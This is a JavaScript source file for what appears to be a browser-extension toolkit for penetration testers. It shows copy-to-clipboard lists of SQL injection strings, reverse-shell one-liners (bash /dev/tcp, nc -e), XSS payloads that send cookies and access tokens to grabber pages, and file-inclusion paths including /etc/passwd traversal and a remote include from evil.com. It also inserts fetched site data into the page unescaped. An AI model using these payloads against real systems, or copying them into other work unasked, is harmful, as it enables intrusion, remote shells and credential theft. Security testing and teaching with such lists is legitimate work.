
document.addEventListener('DOMContentLoaded', function () {
    var sqlButton = document.getElementById('sqlButton');
    var reverseShellButton = document.getElementById('reverseShellButton');
    var xssButton = document.getElementById('xssButton');
    var fileInclusionButton = document.getElementById('fileInclusionButton');
    var encodeButton = document.getElementById('encodeButton');
    var decodeButton = document.getElementById('decodeButton');
    var inputText = document.getElementById('inputText');
    var resultContainer = document.getElementById('resultContainer');

    sqlButton.addEventListener('click', function () {
        renderPayloads(sqlPayloads, sqlButton);
    });

    reverseShellButton.addEventListener('click', function () {
        renderPayloads(reverseShellPayloads, reverseShellButton);
    });

    xssButton.addEventListener('click', function () {
        renderPayloads(xssPayloads, xssButton);
    });

    fileInclusionButton.addEventListener('click', function () {
        renderPayloads(fileInclusionPayloads, fileInclusionButton);
    });

    encodeButton.addEventListener('click', function () {
        encodeText();
    });

    decodeButton.addEventListener('click', function () {
        decodeText();
    });

    var sqlPayloads = [
        "SELECT * FROM users;",
        'INSERT INTO users (username, password) VALUES ("admin", "password");',
        "'UNION SELECT NULL,NULL,NULL -- -",
        "' OR '' = '",
        '" OR 1 = 1 -- -',
        "1' ORDER BY 1--+",
        "ORDER BY 1#",
        "1 or sleep(5)#",
        "' UNION SELECT @@version -- -",
        "' UNION SELECT table_name,NULL from INFORMATION_SCHEMA.TABLES -- -",
        "",
        "' UNION SELECT table_name,NULL FROM all_tables  -- -",
        "' UNION SELECT concat(col1,':',col2) from table_name limit 1 -- -",
        "' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --",
    ];

    var reverseShellPayloads = [
        'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1',
        "bash -i &gt;&amp; /dev/tcp/192.168.10.11/4545 0&gt;&amp;1",
        "nc -e /bin/sh 192.168.10.11 4545",
        "zsh -c 'zmodload zsh/net/tcp && ztcp && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",
        "TF=$(mktemp -u); mkfifo $TF && telnet 0<$TF | /bin sh 1>$TF",
    ];

    
    var xssPayloads = [
        '<script>alert("XSS attack");</script>',
        "<SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js></SCRIPT>",
        "<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>",
        "<script>new Image().src='http://localhost/cookie.php?c='+localStorage.getItem('access_token');</script>",
        "[a](javascript:prompt(document.cookie))",
        "[a](javascript:window.onerror=alert;throw%201)",
        "<svg xmlns='http://www.w3.org/2000/svg' onload='alert(document.domain)'/>",
        "<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>",
        "eval('ale'+'rt(0)');",
        "Set.constructor`alert(14)```;",
    ];

    var fileInclusionPayloads = [
        '/etc/passwd',
        '../etc/passwd',
        '../../../../etc/passwd',
        "foo.php?file=../../../../../../../etc/passwd",
        "/example1.php?page=expect://ls",
        "/example1.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd",
        "http://example.com/index.php?page=http://evil.com/shell.txt",
        "/etc/apache2/apache2.conf",
        "/var/lib/mysql/mysql/user.frm",
        "/boot.ini",
        "/windows/system32/eula.txt",
    ];

    function renderPayloads(payloads, button) {
        var cheatsheetsContainer = document.createElement('div');
        cheatsheetsContainer.className = 'payload-container';

        var listContainer = document.createElement('ul');
        listContainer.className = 'list-group';

        payloads.forEach(function (payload) {
            var listItem = document.createElement('li');
            listItem.className = 'list-group-item';

            var spanText = document.createElement('span');
            spanText.textContent = payload;

            var copyButton = document.createElement('button');
            copyButton.className = 'btn btn-sm btn-info';
            copyButton.textContent = 'Copy';
            copyButton.addEventListener('click', function () {
                copyToClipboard(payload);
            });

            listItem.appendChild(spanText);
            listItem.appendChild(copyButton);
            listContainer.appendChild(listItem);
        });

        cheatsheetsContainer.appendChild(listContainer);

        var oldContainer = document.querySelector('.payload-container');
        if (oldContainer) {
            oldContainer.parentNode.removeChild(oldContainer);
        }

        
        button.parentNode.insertBefore(cheatsheetsContainer, button.nextSibling);
    }

    function copyToClipboard(text) {
        var textarea = document.createElement('textarea');
        textarea.value = text;
        document.body.appendChild(textarea);
        textarea.select();
        document.execCommand('copy');
        document.body.removeChild(textarea);
        alert('Copied to clipboard!');
    }

    var fetchWebsiteButton = document.getElementById('fetchWebsiteButton');
    var websiteLinkInput = document.getElementById('websiteLink');
    var resultContainer = document.getElementById('resultContainer');

    fetchWebsiteButton.addEventListener('click', function () {
        var websiteLink = websiteLinkInput.value.trim();
        if (websiteLink !== '') {
            fetchWebsiteInfo(websiteLink);
        } else {
            alert('Please enter a valid website link.');
        }
    });

    function fetchWebsiteInfo(websiteLink) {
        chrome.runtime.sendMessage({ action: 'fetchWebsiteInfo', websiteLink: websiteLink }, function (response) {
            // Check if the response object is defined
            if (response && response.success) {
                // Display the fetched information
                resultContainer.innerHTML = `
                    <p><strong>Hyperlinks:</strong> ${response.hyperlinks.join(', ')}</p>
                    <p><strong>Sources:</strong> ${response.sources.join(', ')}</p>
                    <p><strong>Scripts:</strong> ${response.scripts.join(', ')}</p>
                `;
            } else {
                // Handle the case where the response object is not in the expected format
                console.error('Error fetching website information:', response);
                alert('Error fetching website information. Please check the link or try again.');
            }
        });
    }

    function encodeText() {
        var plaintext = inputText.value;
        if (plaintext.trim() !== '') {
            var encodedText = btoa(plaintext);
            resultContainer.textContent = 'Encoded Text: ' + encodedText;
        } else {
            alert('Please enter plaintext before encoding.');
        }
    }

    function decodeText() {
        var encodedText = inputText.value;
        if (encodedText.trim() !== '') {
            var decodedText = atob(encodedText);
            resultContainer.textContent = 'Decoded Text: ' + decodedText;
        } else {
            alert('Please enter encoded text before decoding.');
        }
    }
});
